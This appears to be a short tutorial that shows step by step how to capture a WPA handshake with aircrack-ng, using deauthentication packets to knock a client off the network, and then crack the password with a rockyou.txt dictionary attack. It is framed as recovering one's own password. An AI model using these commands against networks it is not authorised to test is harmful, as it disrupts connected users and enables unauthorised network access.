# FILM

[![Watch the video](https://img.youtube.com/vi/p_kWb7se5cQ/maxresdefault.jpg)](https://youtu.be/p_kWb7se5cQ)

# TUTORIAL

1) Enable listening via the network adapter

``` airmon-ng start wlan0 ```

1) We now have a new card name:

``` wlan0mon ```

2) Listen to networks nearby and find yours:

``` airodump-ng wlan0mon ```

3) When you see your network stop listening and copy the bssid, and
channel:

``` airodump-ng wlan0mon --bssid MAC -c CHANNEL [e.g. 6] ```

4) When you see that it is only listening to this network and everything works
we can take action.

Stop and add to the command:

``` -w NAME ```

This will print everything that happens during the file with the given name
listening. We'll need this to take over the .cap file

5) We are looking for MACs of currently connected devices to the router. We copy it and bssid to
the next command.

6) With listening enabled, we perform:

```
 aireplay-ng -a BSSID_MAC -c CLIENT_MAC --deauth 40 wlan0mon
```

Packets will be sent to the client that disconnect him for a moment from the network,
so that he would have to connect to it again automatically.

7) After a while, we stop the attack and look if in the previous console where
we were listening, the following message appeared:

``` WPA handshake ```

If so, we turn off listening. If we don't repeat.

8) The card in the listening mode will no longer be useful to us, so we can turn it off and
go back to the previous version:

``` airmon-ng stop wlan0mon ```

Now you can use the Internet on your computer again;)

9) We proceed to change the .cap file to -> .hccapx

We will use the aircrack tool for this. You can break it with others that may
such options, e.g. hashcat.

Option:

``` -j ```

He will help us in exchange.

10) Enter:

``` aircrack-ng -j OUTPUT_NAME NAME.cap ```

After a while, you should see the file named after the parameter
-j.

11) We approach password recovery. For this we will need some
dictionary we can use some of the e.g. kali system.

``` aircrack-ng NAME.hccapx -w /usr/share/wordlists/rockyou.txt [dictionary] ```

If he finds our password in the dictionary, I will show it to us.

12) Good luck with your recovery!
